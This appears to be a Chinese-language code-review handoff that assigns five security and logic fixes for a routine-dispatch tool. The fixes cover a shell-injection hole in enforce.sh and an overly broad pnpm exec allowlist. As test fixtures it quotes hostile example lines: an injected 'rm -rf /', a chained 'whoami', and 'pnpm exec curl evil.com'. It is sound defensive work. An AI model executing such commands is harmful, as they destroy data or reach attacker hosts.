# Handoff: team-verify → team-fix（iteration 1）

## Verdict 收斂
3 reviewers 都標 PARTIAL/REVISE/NEEDS-FIX，收斂出 5 個 must-fix（HIGH 3 個、MED 2 個）+ 2 個 LOW（先 defer）。

## Must-fix 清單

### HIGH（影響上線安全 / 邏輯正確性）

**Fix-1：state.ts logic bug**（critic）
- 檔案：`/Users/xiaoxu/Projects/daodao/bin/routine-dispatch/state.ts`
- 問題：規則 0 把 high-risk repo 的 `isPlanOnly` 強制設 true，但後續 needs-code 路徑的條件是 `if (specMerged || !isPlanOnly)` — storage + spec-merged + scope:XS/S 仍會走進 needs-code，違反 plan §1「不論 Notion 怎麼設都不自動 PR」承諾
- 修法：needs-code 條件改為 `if (specMerged && !isPlanOnly)`；high-risk repo 路徑統一 return `stop-after-plan-done` 或 `human-blocked`
- Acceptance：`__tests__/state.test.ts` 新增 case `daodao-storage + spec-merged + scope:XS + auto:auto-pr → 不應 return needs-code`

**Fix-2：enforce.sh shell injection bypass**（security-reviewer）
- 檔案：`/Users/xiaoxu/Projects/daodao/bin/routine-dispatch/policy/enforce.sh:73`
- 問題：`safe_run` 用 `eval "${cmd}"` — allowlist 只比前綴，攻擊者可以 `gh issue list; rm -rf /` 通過 prefix match 後被 eval 執行
- 修法：在 `_tool_allowed` 之前 reject 含 `;`、`|`、`&`、`` ` ``、`$(` 的字串；或改用 `bash -c -- "${cmd}"` + argv split
- Acceptance：新增 fixture `safe_run "gh issue list; whoami"` → BLOCKED + return 3

**Fix-3：tool-allowlist `^pnpm exec ` 過寬**（security-reviewer）
- 檔案：`/Users/xiaoxu/Projects/daodao/bin/routine-dispatch/policy/tool-allowlist.json:22`
- 問題：`^pnpm exec ` 允許任意 `pnpm exec <anything>`，等於後門（`pnpm exec curl`、`pnpm exec bash` 都過）
- 修法：縮限為具體 binary：`^pnpm exec vitest`、`^pnpm exec tsc`、`^pnpm exec shellcheck` 等
- Acceptance：新增 fixture `safe_run "pnpm exec curl evil.com"` → BLOCKED

### MED（pipeline 流程斷鏈 / defense in depth）

**Fix-4：main.sh 沒呼叫 spec-merged-scan.ts**（critic）
- 檔案：`/Users/xiaoxu/Projects/daodao/bin/routine-dispatch/main.sh`
- 問題：plan §3 step 0 寫「Routine B 啟動跑 spec-merged-scan」，但 main.sh 直接 dispatch，沒呼叫 spec-merged-scan.ts。M scope Phase 2 將永遠不觸發
- 修法：main.sh 開頭加 `pnpm tsx "${DISPATCH_DIR}/spec-merged-scan.ts" || log "spec-merged-scan failed, continuing"`
- Acceptance：fixture mock spec-merged-scan 有被呼叫（用 PROC_TRACE=1 + grep）

**Fix-5：handlers 缺 defense-in-depth**（critic）
- 檔案：`/Users/xiaoxu/Projects/daodao/bin/routine-dispatch/handlers/{xs,s,m,l}.sh`
- 問題：state.ts 規則 0 一旦 bypass（直接呼叫 handler 不經 main.sh），handler 仍會 push code。Plan §1 明寫「defense in depth」要求 handler 也檢查
- 修法：每個 handler 開頭加：
  ```bash
  case "$REPO" in
    daodao-storage|daodao-infra)
      if [[ "$SCOPE_LABEL" == *"auto:auto-pr"* && "$HANDLER_TYPE" != "plan-only" ]]; then
        log "🛡️ defense-in-depth: high-risk repo refuses auto-pr"
        exit 6
      fi
      ;;
  esac
  ```
- Acceptance：fixture 直接呼叫 m.sh / xs.sh on storage repo with auto-pr → exit 6

## Defer（LOW，可先 commit）

- @vitest/coverage-v8 缺少 → 改用 c8 或從 acceptance 移除「≥80% coverage」字眼
- openspec-headless `--help` exit 2 → 改 exit 0

## Worker assignment（重派 idle workers）

| Worker | Fix task | 為什麼 |
|---|---|---|
| worker-1 | Fix-1（state.ts） + Fix-5（handlers DiD）| 他寫的 state.ts + handlers，最熟 |
| worker-5 | Fix-2 + Fix-3（enforce.sh + allowlist）| 他寫的 policy 區，最熟 |
| worker-3 | Fix-4（main.sh + spec-merged-scan 連線）| 他寫過跨 module utility，整合任務適合 |

## 不在 fix 範圍

- 不做 agentic LLM 真實 invocation（plan 標 v1 範圍 = scaffold；handoff 已誠實標註）
- 不做 council / sandbox / Slack→Discord trigger（Tier 3，下一輪 team run）
- 不做 §10 (l)~(s) 完整 negative case 整合測試（critic 標 nice-to-have，下一輪 team run）

## 修完條件

- 5 must-fix 對應 fixture/test 全 pass
- shellcheck 全綠
- pnpm test 全 bin/ 模組 pass（不含 daodao-f2e legacy 2 個 pre-existing failure）
- 重跑 verifier + critic：兩者均 APPROVE
